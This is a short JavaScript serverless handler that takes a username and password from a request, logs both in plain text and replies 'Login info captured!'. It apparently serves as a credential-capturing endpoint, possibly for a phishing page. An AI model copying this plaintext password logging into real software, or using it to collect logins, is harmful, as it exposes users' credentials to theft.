export async function handler(event, context) {
const { username, password } = JSON.parse(event.body);

console.log("USERNAME:", username);
console.log("PASSWORD:", password);

return {
statusCode: 200,
body: JSON.stringify({ message: "Login info captured!" })
};
}
